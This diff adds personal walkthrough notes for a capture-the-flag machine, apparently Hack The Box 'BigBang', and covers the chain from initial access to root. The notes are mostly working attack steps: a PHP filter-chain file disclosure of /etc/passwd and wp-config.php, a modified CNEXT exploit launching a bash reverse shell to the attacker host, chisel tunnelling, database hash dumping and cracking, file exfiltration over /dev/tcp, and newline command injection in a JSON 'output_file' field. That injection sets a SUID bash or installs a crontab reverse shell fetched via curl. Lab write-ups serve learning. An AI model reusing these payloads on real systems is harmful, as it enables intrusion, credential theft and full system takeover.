@@ -1,3 +1,4 @@
+-- Until user shell
 edit /etc/hosts -> <ip> bigbang.htb blog.bigbang.htb
 
 sudo podman run --rm   wpscanteam/wpscan   --url http://blog.bigbang.htb   --api-token <token from wpscan website>
@@ -12,4 +13,84 @@ action=upload_image_from_url&url=/etc/passwd&id=1&accepted_fils=image/gif -- fai
 
 install wrapwrap -> python3 wrapwrap.py '/etc/passwd' 'GIF89a' '' 0 -> cat chain.txt -><chain>
 
-action=upload_image_from_url&url=<chain>&id=1&accepted_fils=image/gif -- success due to prefix GIF89a
+action=upload_image_from_url&url=<chain>&id=1&accepted_fils=image/gif -- success due to prefix GIF89a -> response has <url>
+GET <url> -- file disclosure... change /etc/passwd to ../wp-config.php will also show the database credentials
+
+browse & install cnext-exploit
+edit cnext-exploit.py
+
+import urllib.parse
+
+def send:
+  data = {
+            'action':'upload_image_from_url',
+            'url':urllib.parse.quote_plus(<chain without file location> + path),
+            'id':1,
+            'accepted_files':'image/gif'
+        }
+  return self.session.post(self.url, data=data)
+def download:
+  response = self.send(path)
+  url = response.json()['response']
+  data = self.session.get(url).content
+        
+  return data[6:]
+
+if text not in result: -> if result not in text:
+
+def check_token:
+  result = safe_download(path)
+  if result in text.encode()
+    return True
+  return False
+
+def get_symbols_and_addresses:
+  self.download_file(libc.path, LIBC_FILE)
+  with open(LIBC_FILE, "ab") as f:
+    f.write(b"\x00"*16)
+    f.close()
+
+comment out left lines in check_vulnerable about zlib
+
+python3 http://blog.bigbang.htb/wp-admin/admin-ajax.php "bash -c 'bash -i >& /dev/tcp/<myip>/<myport> 0>&1'"
+nc -lvnp <myport> -> get www-data shell
+
+-- Until shawking
+../wp-config.php has user credentials, but mysql is not installed -> need port forwarding
+local: ./chisel server -p <myport2> -reverse
+www-data: download chisel on shell -> ./chisel client <myip>:<myport2> R:3306:172.17.0.1:3306
+local: mysql -u <sqluser> -h 127.0.0.1 -p -> enter <sqlpass> -> select * from wordpress.wp_users -> copy hash & hashcat -> get <shawkingpass>
+
+-- Until developer
+shawking: /opt/data/grafana.db has hash, but no sqlite3 -> cat grafana.db > /dev/tcp/<myip>/<myport3>
+local: nc -lvnp <myport3> > grafana.db; sqlite3 grafana.db; select * from user; -> create <hashfile> - (format)<passwordhash>,<salt>
+install grafana2hashcat -> python3 grafana2hashcat <hashfile> -> copy hash & hashcat -> get developer
+
+-- Until root
+~/android/satellite.apk -> copy to local
+7z x satellite.apk -> grep -iR 'bigbang.htb' . -> classes.dex contains bigbang.htb -> jadx $(pwd)/classes.dex -d $(pwd) -> 
+grep -iR 'bigbang.htb' . -> 2 files detected ->
+information about http://app.bigbang.htb:9090/login & command
+
+portforward port 9090 to local port 9090(chisel or ssh -L 9090:127.0.0.1:9090) ->
+curl localhost:9090 -x http://localhost:8080 -> grep packet in burpsuite -> send to repeater, change request method ->
+/login  <-- info from first file
+Content-Type: application/json
+{} -> Missing username or password
+{"username":"developer", "password":"<developerpass>"} -> get <token>
+
+/command  <-- info from second file
+{"command":"send_image","output_file":"<file loc>"} -> return Error generating image
+{"command":"send_image","output_file":"<file loc>\nsleep 1"} -> injection successful
+
+
+1. developer: cp /bin/bash /tmp/bash
+{"command":"send_image","output_file":"<file loc>\nchown root:root /tmp/bash"} 
+{"command":"send_image","output_file":"<file loc>\nchmod 4755 /tmp/bash"}
+developer: /tmp/bash -p -> get root shell
+
+or
+
+2. local: echo "* * * * * root bash -c 'bash -i >& /dev/tcp/<myip>/<myport4> 0>&1'" > crontab; python3 -m http.server
+{"command":"send_image","output_file":"<file loc>\ncurl http://<myip>:8000/crontab -o /etc/crontab"}
+nc -lvnp <myport4> -> wait for a minute -> get root shell
